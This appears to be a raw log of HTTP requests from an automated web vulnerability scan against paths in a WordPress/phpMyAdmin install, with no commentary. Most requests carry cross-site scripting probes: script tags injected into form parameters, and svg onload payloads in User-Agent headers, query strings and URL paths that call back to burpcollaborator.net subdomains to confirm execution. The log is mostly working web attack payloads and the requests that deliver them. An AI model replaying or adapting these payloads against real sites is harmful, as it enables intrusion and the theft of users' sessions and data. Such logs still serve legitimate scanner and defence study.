Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2=1'%22()%26%25<acx><ScRiPt%20>txTL(9379)</ScRiPt>&select3=1&select4=2&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2='%22()%26%25<acx><ScRiPt%20>txTL(9127)</ScRiPt>&select3=1&select4=2&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2=1'%22()%26%25<acx><ScRiPt%20>txTL(9687)</ScRiPt>&select3=2&select4=2&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=3&select2='%22()%26%25<acx><ScRiPt%20>txTL(9498)</ScRiPt>&select3=2&select4=2&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=3&select2=1'%22()%26%25<acx><ScRiPt%20>txTL(9710)</ScRiPt>&select3=2&select4=2&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=1&select2=1'%22()%26%25<acx><ScRiPt%20>txTL(9538)</ScRiPt>&select3=3&select4=2&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2=1'%22()%26%25<acx><ScRiPt%20>txTL(9945)</ScRiPt>&select3=3&select4=2&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2='%22()%26%25<acx><ScRiPt%20>txTL(9586)</ScRiPt>&select3=3&select4=2&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=3&select2='%22()%26%25<acx><ScRiPt%20>txTL(9484)</ScRiPt>&select3=3&select4=2&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2=1'%22()%26%25<acx><ScRiPt%20>txTL(9182)</ScRiPt>&select3=1&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=3&select2=1'%22()%26%25<acx><ScRiPt%20>txTL(9315)</ScRiPt>&select3=1&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2=1'%22()%26%25<acx><ScRiPt%20>txTL(9580)</ScRiPt>&select3=2&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=1&select2='%22()%26%25<acx><ScRiPt%20>txTL(9058)</ScRiPt>&select3=3&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=1&select2=1&select3='%22()%26%25<acx><ScRiPt%20>txTL(9203)</ScRiPt>&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=1&select2=1&select3='%22()%26%25<acx><ScRiPt%20>txTL(9662)</ScRiPt>&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2=1&select3=1'%22()%26%25<acx><ScRiPt%20>txTL(9408)</ScRiPt>&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=3&select2=1&select3=1'%22()%26%25<acx><ScRiPt%20>txTL(9826)</ScRiPt>&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=3&select2=2&select3='%22()%26%25<acx><ScRiPt%20>txTL(9010)</ScRiPt>&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=3&select2=2&select3=1'%22()%26%25<acx><ScRiPt%20>txTL(9276)</ScRiPt>&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=1&select2=3&select3=1'%22()%26%25<acx><ScRiPt%20>txTL(9449)</ScRiPt>&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=1&select2=3&select3='%22()%26%25<acx><ScRiPt%20>txTL(9012)</ScRiPt>&select4=3&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=1&select2=1&select3='%22()%26%25<acx><ScRiPt%20>txTL(9772)</ScRiPt>&select4=1&select5=2&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2=1&select3=1'%22()%26%25<acx><ScRiPt%20>txTL(9363)</ScRiPt>&select4=1&select5=2&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2=1&select3=1'%22()%26%25<acx><ScRiPt%20>txTL(9991)</ScRiPt>&select4=1&select5=2&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=1&select2=3&select3='%22()%26%25<acx><ScRiPt%20>txTL(9748)</ScRiPt>&select4=1&select5=2&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=3&select2=3&select3='%22()%26%25<acx><ScRiPt%20>txTL(9732)</ScRiPt>&select4=1&select5=2&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=1&select2=1&select3=1&select4='%22()%26%25<acx><ScRiPt%20>txTL(9335)</ScRiPt>&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery/sizzle/test/formaction?action=Test&check=on&foo%5bbar%5d=1&hidden=&name=name&radio1=on&radio2=1&search=search&select1=2&select2=1&select3=1&select4='%22()%26%25<acx><ScRiPt%20>txTL(9032)</ScRiPt>&select5=3&text2=Test HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/spinner.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/spinner.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/spinner.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: '""><svg/onload=(new(Image)).src='//5gmc600ur1vpq2w81goovi59j0pufx3ptdo0eo3\56burpcollaborator.net'>
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/spinner.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: javascript:/*</script><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\/pibw8k2etlx9smys30q8x27tlkrehh59wxrkh86\.burpcollaborator.net/).replace(/\\/g,[]))//'>
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/tabs.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/tabs.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/tabs.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/tooltip.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/tooltip.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/tooltip.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/widget.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/widget.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/tooltip.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/widget.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/widget.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/keyhandler.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/makegrid.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/keyhandler.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/keyhandler.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/widget.js?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2f4z4bpzjta0eo91f7kf7neho82z8tzjnbdz7mxam%5c56burpcollaborator.net'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/widget.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/keyhandler.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/makegrid.js?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fmi8t8h2btix6sjyp3xq5xz7qlhrbi46wxkr7hv6%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/keyhandler.js?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fgtdnjbd54c803d9jer1z8tikwb25twho7c1zrng%5c56burpcollaborator.net'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/keyhandler.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: '""><svg/onload=(new(Image)).src='//xab40sumltphkuq0v8igpaz1dsjmady5otjg94y\56burpcollaborator.net'>
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/line_counts.php HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//z446uuoofvjjewk2pacijct37udo4fs7iv9nwdk2%5c56burpcollaborator.net'%3e HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/line_counts.php HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/line_counts.php HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//cm2jc761x81ww92f7nuv1pbgp7v1mtal09r1er2g%5c56burpcollaborator.net'%3e HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/hxionch68dc17edkis50cuml0c66xylqce36qwel%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/sortable.js?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fbeti46y0p7tvo8uezmmuto3fh6n0d21usim5ct1%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
